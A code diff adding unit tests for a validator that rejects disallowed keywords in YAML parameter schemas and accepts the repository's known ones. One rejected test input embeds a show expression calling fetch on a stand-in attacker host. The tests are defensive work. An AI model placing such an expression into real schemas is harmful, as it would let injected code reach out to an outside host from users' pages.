@@ -105,6 +105,138 @@ describe("checkScriptYaml rejects a schema outside the allowed characters", () =
   });
 });
 
+describe("checkScriptYaml allows only the keywords in use", () => {
+  const param = (...lines: string[]) => [
+    "  properties:",
+    "    a:",
+    "      type: string",
+    ...lines.map((line) => `      ${line}`),
+  ];
+
+  test.each([
+    ["a show expression", param("showExpr: fetch('https://evil.example/x')")],
+    ["a custom error message", param("customErrorMessage: boom")],
+    ["a password flag", param("password: true")],
+    ["a quoted keyword", param("'showExpr': x")],
+    ["a double quoted keyword", param('"showExpr": x')],
+    ["a pattern", param("pattern: .*")],
+    ["a keyword at the top of the schema", ["  additionalProperties: false"]],
+    [
+      "a keyword in the items",
+      [
+        "  properties:",
+        "    a:",
+        "      type: array",
+        "      items:",
+        "        showExpr: x",
+      ],
+    ],
+    [
+      "a keyword in a nested object",
+      [
+        "  properties:",
+        "    a:",
+        "      type: object",
+        "      properties:",
+        "        b:",
+        "          showExpr: x",
+      ],
+    ],
+    [
+      "a flow mapping for a parameter",
+      ["  properties:", "    a: {type: string, showExpr: x}"],
+    ],
+    ["a flow mapping for the properties", ["  properties: {a: {showExpr: x}}"]],
+    [
+      "a flow mapping for the items",
+      [
+        "  properties:",
+        "    a:",
+        "      type: array",
+        "      items: {showExpr: x}",
+      ],
+    ],
+    [
+      "a list for the items",
+      [
+        "  properties:",
+        "    a:",
+        "      type: array",
+        "      items:",
+        "        - type: string",
+      ],
+    ],
+    ["a line that is not a key", ["  properties:", "    just text"]],
+  ])("rejects %s", (_label, lines) => {
+    expect(reason(lines)).toBe("unsafe_schema");
+  });
+
+  test("accepts a parameter named like a rejected keyword", () => {
+    expect(
+      reason(["  properties:", "    showExpr:", "      type: string"]),
+    ).toBe("ok");
+  });
+
+  test("accepts the keywords of the repository", () => {
+    expect(
+      reason([
+        "  properties:",
+        "    a:",
+        "      type: array",
+        "      description: list of names",
+        "      default: []",
+        "      originalType: string",
+        "      format: resource-record",
+        "      resourceType: postgresql",
+        "      items:",
+        "        type: string",
+        "        enum:",
+        "          - x",
+        "          - y",
+        "  required:",
+        "    - a",
+      ]),
+    ).toBe("ok");
+  });
+
+  test("accepts a nested object with its own properties", () => {
+    expect(
+      reason([
+        "  properties:",
+        "    a:",
+        "      type: object",
+        "      properties:",
+        "        b:",
+        "          type: string",
+      ]),
+    ).toBe("ok");
+  });
+
+  test("does not read the content of a default as keywords", () => {
+    expect(
+      reason([
+        "  properties:",
+        "    a:",
+        "      type: object",
+        "      default:",
+        "        anything: 1",
+      ]),
+    ).toBe("ok");
+  });
+
+  test("does not read the lines of a folded description as keywords", () => {
+    expect(
+      reason([
+        "  properties:",
+        "    a:",
+        "      type: string",
+        "      description: >",
+        "        note: this line looks like a key",
+      ]),
+    ).toBe("ok");
+  });
+});
+
 describe("splitTopLevelBlocks rejects line separators and marks", () => {
   test.each([
     ["a next line", String.fromCharCode(0x85)],
